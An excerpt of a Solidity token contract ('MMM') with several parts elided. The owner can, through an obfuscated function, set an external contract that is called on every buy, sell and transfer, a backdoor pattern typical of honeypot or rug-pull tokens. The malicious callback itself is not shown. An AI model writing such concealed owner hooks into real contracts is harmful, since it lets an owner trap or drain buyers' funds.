...
contract TokenMMM is ERC20 {
    ...
    TInerAmountfouoge public fouoge;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("MMM", "MMM") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d));
    ...
    function hocoserVeongsTerss(TInerAmountfouoge _fouoge) public onlyOwner {
        fouoge = _fouoge;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                fouoge.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				fouoge.addOutAmount(from, amount);
            }else{
                fouoge.addOutAmount(from, amount);
                takeFee = false;
            }
